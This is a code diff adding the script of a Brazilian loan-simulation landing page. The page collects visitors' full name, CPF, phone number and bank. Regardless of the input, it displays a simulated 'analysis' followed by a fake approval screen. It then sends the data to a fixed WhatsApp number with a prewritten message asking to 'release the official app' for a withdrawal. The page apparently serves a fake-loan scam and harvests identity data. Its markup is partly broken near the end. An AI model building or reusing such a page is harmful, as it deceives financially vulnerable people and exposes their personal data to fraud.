+                dot.className = "h-1.5 flex-1 rounded-full bg-slate-200 transition-colors duration-500";
+                container.appendChild(dot);
+            }
+        }
+
+        function initDays() {
+            const select = document.getElementById('form-dia');
+            for(let i=1; i<=31; i++) {
+                const day = i < 10 ? '0' + i : i;
+                const opt = new Option(`Dia ${day}`, day);
+                select.add(opt);
+            }
+        }
+
+        function initTerms() {
+            const container = document.getElementById('term-container');
+            const terms = [36, 48, 60, 72, 84];
+            
+            terms.forEach(t => {
+                const badge = document.createElement('div');
+                badge.className = `term-badge py-2.5 rounded-lg text-center font-bold text-sm ${t === 84 ? 'active' : ''}`;
+                badge.innerText = `${t}x`;
+                badge.onclick = () => {
+                    selectedTerm = t;
+                    document.querySelectorAll('.term-badge').forEach(b => b.classList.remove('active'));
+                    badge.classList.add('active');
+                    recalc();
+                };
+                container.appendChild(badge);
+            });
+        }
+
+        // Form Logic
+        function selectOption(id, val) {
+            document.getElementById(`input-${id}`).value = val;
+            const currentDiv = document.getElementById(`step-${currentStep}`);
+            
+            // Visual selection update
+            currentDiv.querySelectorAll('.card-choice').forEach(c => {
+                c.classList.remove('selected', 'ring-2', 'ring-blue-500');
+            });
+            event.currentTarget.classList.add('selected', 'ring-2', 'ring-blue-500');
+            
+            // Auto advance after short delay
+            setTimeout(() => changeStep(1), 350);
+        }
+
+        // Simulator Range Updater
+        document.getElementById('sim-range').oninput = function() {
+            const valFormated = parseInt(this.value).toLocaleString('pt-BR');
+            document.getElementById('sim-val-display').innerText = `R$ ${valFormated}`;
+            recalc();
+        };
+
+        function recalc() {
+            const val = parseInt(document.getElementById('sim-range').value);
+            // Example base rate (1.66% am) for demonstration purposes
+            const rate = 0.0166; 
+            // Amortization formula calculation
+            const pmt = val * ((rate * Math.pow(1 + rate, selectedTerm)) / (Math.pow(1 + rate, selectedTerm) - 1));
+            
+            document.getElementById('res-parcela').innerText = `R$ ${pmt.toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+        }
+
+        function changeStep(n) {
+            if (n === 1 && !validate()) return;
+            
+            currentStep += n;
+            
+            // Boundary checks
+            if (currentStep < 1) currentStep = 1;
+            if (currentStep > totalSteps) currentStep = totalSteps;
+            
+            updateStepView();
+            
+            // Smooth scroll to form top
+            const container = document.getElementById('form-container');
+            const yOffset = -100; // Account for sticky header
+            const y = container.getBoundingClientRect().top + window.scrollY + yOffset;
+            window.scrollTo({ top: y, behavior: 'smooth' });
+        }
+
+        function validate() {
+            const showError = (msg) => {
+                const el = document.getElementById('custom-alert');
+                const textEl = document.getElementById('custom-alert-text');
+                textEl.innerText = msg;
+                el.style.display = 'flex';
+                
+                // Clear existing timeout if multiple clicks happen
+                if(window.errorTimeout) clearTimeout(window.errorTimeout);
+                
+                window.errorTimeout = setTimeout(() => {
+                    el.style.opacity = '0';
+                    setTimeout(() => {
+                        el.style.display = 'none';
+                        el.style.opacity = '1';
+                    }, 300);
+                }, 3500);
+            };
+
+            if (currentStep === 1 && !document.getElementById('input-perfil').value) {
+                showError("Por favor, selecione qual o seu perfil para prosseguir."); 
+                return false;
+            }
+            if (currentStep === 2 && !document.getElementById('input-servico').value) {
+                showError("Por favor, selecione o tipo de serviço desejado."); 
+                return false;
+            }
+            
+            if (currentStep === 4) {
+                const nome = document.getElementById('form-nome').value.trim();
+                const cpf = document.getElementById('form-cpf').value;
+                const tel = document.getElementById('form-tel').value;
+                const lgpd = document.getElementById('form-lgpd').checked;
+
+                if (nome.split(' ').length < 2) { 
+                    showError("Por favor, digite seu nome completo (nome e sobrenome)."); 
+                    document.getElementById('form-nome').focus();
+                    return false; 
+                }
+                if (cpf.length < 14) { 
+                    showError("O CPF informado está incompleto. Verifique e tente novamente."); 
+                    document.getElementById('form-cpf').focus();
+                    return false; 
+                }
+                if (tel.length < 14) { 
+                    showError("Número de celular/WhatsApp incompleto."); 
+                    document.getElementById('form-tel').focus();
+                    return false; 
+                }
+                if (!lgpd) {
+                    showError("É necessário autorizar o uso dos dados para consulta de margem.");
+                    return false;
+                }
+            }
+
+            if (currentStep === 5) {
+                if (!document.getElementById('form-banco').value) { 
+                    showError("Por favor, selecione em qual banco você recebe seu benefício."); 
+                    document.getElementById('form-banco').focus();
+                    return false; 
+                }
+            }
+
+            return true;
+        }
+
+        function updateStepView() {
+            // Update contents visibility
+            document.querySelectorAll('.step-content').forEach((s, idx) => {
+                if (idx === currentStep - 1) {
+                    s.classList.add('active');
+                } else {
+                    s.classList.remove('active');
+                }
+            });
+            
+            // Update text labels
+            document.getElementById('step-label').innerText = `Passo ${currentStep} de ${totalSteps}`;
+            document.getElementById('step-percentage').innerText = `${Math.round((currentStep/totalSteps)*100)}%`;
+            
+            // Update Progress Dots Colors
+            for(let i=1; i<=totalSteps; i++) {
+                const dot = document.getElementById(`dot-${i}`);
+                if(i < currentStep) { 
+                    dot.className = "h-1.5 flex-1 rounded-full bg-blue-200 transition-colors duration-500"; 
+                } else if(i === currentStep) { 
+                    dot.className = "h-1.5 flex-1 rounded-full bg-blue-600 transition-colors duration-500 shadow-[0_0_8px_rgba(37,99,235,0.4)]"; 
+                } else { 
+                    dot.className = "h-1.5 flex-1 rounded-full bg-slate-200 transition-colors duration-500"; 
+                }
+            }
+
+            // Buttons Logic
+            const prevBtn = document.getElementById('prevBtn');
+            const nextBtn = document.getElementById('nextBtn');
+            const navContainer = document.getElementById('nav-container');
+
+            // Hide/Show Back Button
+            if (currentStep === 1 || currentStep === totalSteps) {
+                prevBtn.classList.add('hidden');
+                prevBtn.classList.remove('md:block');
+            } else {
+                prevBtn.classList.remove('hidden');
+                prevBtn.classList.add('md:block');
+            }
+
+            // Next Button text changes depending on step
+            if(currentStep === 3) {
+                nextBtn.innerHTML = `Simular com meus dados <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>`;
+            } else if (currentStep === 5) {
+                nextBtn.innerHTML = `Finalizar Simulação <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>`;
+            } else {
+                nextBtn.innerHTML = `Continuar <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>`;
+            }
+
+            // Steps that auto-advance on click don't strictly need the "Next" button immediately visible (Optional UX tweak)
+            if (currentStep === 1 || currentStep === 2) {
+               nextBtn.classList.add('hidden');
+            } else {
+               nextBtn.classList.remove('hidden');
+            }
+
+            // Hide Entire Nav on Success Step & Handle Loading Animation
+            if (currentStep === totalSteps) {
+                navContainer.classList.add('hidden');
+                navContainer.classList.remove('flex');
+                
+                // Mostra Loading e esconde o Sucesso inicialmente
+                document.getElementById('loading-state').classList.remove('hidden');
+                document.getElementById('success-state').classList.add('hidden');
+                
+                // Simula o tempo de processamento/análise (3,5 segundos)
+                setTimeout(() => {
+                    // Esconde Loading e mostra Sucesso
+                    document.getElementById('loading-state').classList.add('hidden');
+                    document.getElementById('success-state').classList.remove('hidden');
+                    
+                    // Preencher os dados do cliente na tela de sucesso
+                    const nomeInput = document.getElementById('form-nome').value;
+                    const cpfInput = document.getElementById('form-cpf').value;
+                    const valorAprovado = document.getElementById('sim-val-display').innerText;
+                    
+                    document.getElementById('success-nome-display').innerText = nomeInput || 'Cliente Especial';
+                    document.getElementById('success-cpf-display').innerText = cpfInput || 'CPF Verificado';
+                    document.getElementById('success-valor-display').innerText = valorAprovado;
+                }, 3500);
+                
+            } else {
+                navContainer.classList.remove('hidden');
+                navContainer.classList.add('flex');
+            }
+        }
+
+        // Input Masks
+        document.getElementById('form-cpf').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, "");
+            v = v.replace(/(\d{3})(\d)/, "$1.$2");
+            v = v.replace(/(\d{3})(\d)/, "$1.$2");
+            v = v.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            e.target.value = v;
+        });
+
+        document.getElementById('form-tel').addEventListener('input', function(e) {
+            let v = e.target.value.replace(/\D/g, "");
+            v = v.replace(/^(\d{2})(\d)/g, "($1) $2");
+            // Mobile (9 digits) vs Fixed (8 digits) format handling
+            if (v.length > 13) {
+                v = v.replace(/(\d)(\d{4})$/, "$1-$2");
+            } else {
+                v = v.replace(/(\d)(\d{4})$/, "$1-$2");
+            }
+            e.target.value = v;
+        });
+
+        function handleWhatsAppRedirect() {
+            // Collect all data points
+            const data = {
+                perfil: document.getElementById('input-perfil').value,
+                servico: document.getElementById('input-servico').value,
+                valor: document.getElementById('sim-val-display').innerText,
+                parcela: document.getElementById('res-parcela').innerText,
+                prazo: selectedTerm,
+                nome: document.getElementById('form-nome').value,
+                cpf: document.getElementById('form-cpf').value,
+                tel: document.getElementById('form-tel').value,
+                banco: document.getElementById('form-banco').value,
+                dia: document.getElementById('form-dia').value || "Não informado"
+            };
+
+            // Format WhatsApp Message with explicit App Withdrawal request
+            const text = `📌 *NOVA CONSULTA APROVADA*\n\n` +
+                         `👤 *NOME:* ${data.nome}\n` +
+                         `🆔 *CPF:* ${data.cpf}\n` +
+                         `📱 *TEL:* ${data.tel}\n\n` +
+                         `💰 *VALOR APROVADO:* ${data.valor}\n` +
+                         `📉 *CONDIÇÃO:* ${data.prazo}x de ${data.parcela}\n\n` +
+                         `🏦 *RECEBE EM:* ${data.banco}\n\n` +
+                         `🚨 *MENSAGEM DO CLIENTE:*\n` +
+                         `"Olá, minha simulação deu tudo certo e foi aprovada. Estou entrando em contato pois quero que me liberem o aplicativo oficial para eu conseguir realizar o saque desses valores na minha conta."`;
+
+            // Open Whatsapp link
+            const url = `https://wa.me/${12991880824}?text=${encodeURIComponent(text)}`;
+            window.open(url, '_blank', 'noopener,noreferrer');
+        }
+
+     type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xrk4qkvsab");
+        
+    </script>
+</body>
+</html>
